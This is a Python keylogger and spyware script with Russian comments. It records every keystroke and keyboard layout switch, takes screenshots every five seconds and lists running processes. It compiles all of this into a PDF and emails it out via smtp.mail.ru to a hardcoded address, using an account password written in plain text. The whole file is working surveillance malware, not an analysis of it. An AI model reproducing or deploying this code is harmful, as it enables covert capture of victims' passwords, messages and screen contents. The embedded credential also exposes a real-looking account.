import keyboard
from fpdf import FPDF
import pyautogui
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
from reportlab.pdfbase.ttfonts import TTFont
from reportlab.pdfbase import pdfmetrics
import ctypes
import psutil

start_time = time.time()
chek_time = 5


text = ""

def leng():
    global text
    user32 = ctypes.windll.user32
    hkl = user32.GetKeyboardLayout(0)
    language_id = hkl & 0xFFFF
    save_id = language_id
    if (save_id == language_id) & (language_id == 0x0419):  # dddввввlanguage ID for Russian keyboard layout
        text += " раскладка: Русская "
    elif (save_id == language_id) & (language_id == 0x0409):  # language ID for English keyboard layoutas
        text += " раскладка: Английская "


def on_key_event(event):

    global text
    global chek_time
    global start_time



    if event.event_type == keyboard.KEY_DOWN:
        if event.name == "space":
            text += " "
        elif (keyboard.is_pressed('alt')) & (keyboard.is_pressed('shift')):
            text += " Расскладка измененна "
        else:
            if event.name != 'alt':
                text += event.name

    if (time.time() - start_time) >= chek_time:
        screenshot = pyautogui.screenshot()
        screenshot.save(".\doc.jpg")
        start_time = time.time()
        another_function()  # Вызов другой функции

def add_text_and_image_to_pdf(pdf_file, text, image_file):
    c = canvas.Canvas(pdf_file, pagesize=letter)
    pdfmetrics.registerFont(TTFont('Arial', 'arial.ttf'))  # Укажите путь к файлу шрифтаdf

    # Установка шрифта для использования в PDF файле
    c.setFont("Arial", 12)

    x = 100
    y = 700

    line_limit = 70  # Максимальное количество символов на строке


    text_lines = [text[i:i + line_limit] for i in range(0, len(text), line_limit)]
    for line in text_lines:
        c.drawString(x, y, line)
        y -= 12  # Переход к новой строкеaa

    if (y > 300) or (y == 300):
        c.drawImage(image_file, x, y-210, width=200, height=200)  # Указываем координаты для размещения изображения
    else:
        c.showPage()
        c.setFont("Arial", 12)
        x = 100
        y = 300
        c.drawImage(image_file, x, y, width=400, height=400)  # Указываем координаты для размещения изображенияdfasdfaaaффф
    text = ""
    for proc in psutil.process_iter(['pid', 'name']):
        text += str(proc.info)

    c.showPage()
    c.setFont("Arial", 12)
    x = 100
    y = 700
    line_limit = 40
    text_lines = [text[i:i + line_limit] for i in range(0, len(text), line_limit)]
    for line in text_lines:
        c.drawString(x, y, line)
        y -= 12

    c.save()

def another_function():
    global text
    pdf = FPDF()
    pdf.add_page()
    pdfmetrics.registerFont(TTFont('Arial', 'arial.ttf'))
    pdf.set_font("Arial", size=12)
    pdf.output("./filename.pdf")
    add_text_and_image_to_pdf("./filename.pdf", text, ".\doc.jpg")
    soobchenie()


def soobchenie():
    email_user = 'sprydokhin@mail.ru'
    email_password = 'M2MeAxF3KE85Fgddex4F'

    # Адрес получателя
    email_send = 'sprydokhin@mail.ru'

    # Создание объекта письма
    subject = 'Отправка PDF файла'
    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_send
    msg['Subject'] = subject

    # Текст сообщения
    body = 'Привет, вот твой PDF файл'
    msg.attach(MIMEText(body, 'plain'))

    # Путь к PDF файлу
    filename = './filename.pdf'
    attachment = open(filename, 'rb')

    # Создание объекта для отправки PDF
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f"attachment; filename= {filename}")

    # Прикрепляем PDF к сообщению
    msg.attach(part)

    # Установка соединения с SMTP сервером и отправка письма
    server = smtplib.SMTP('smtp.mail.ru', 587)
    server.starttls()
    server.login(email_user, email_password)
    tex = msg.as_string()
    server.sendmail(email_user, email_send, tex)
    server.quit()

    print('PDF файл успешно отправлен')

if __name__ == '__main__':
    leng()
    keyboard.on_press(on_key_event)
    keyboard.wait('esc')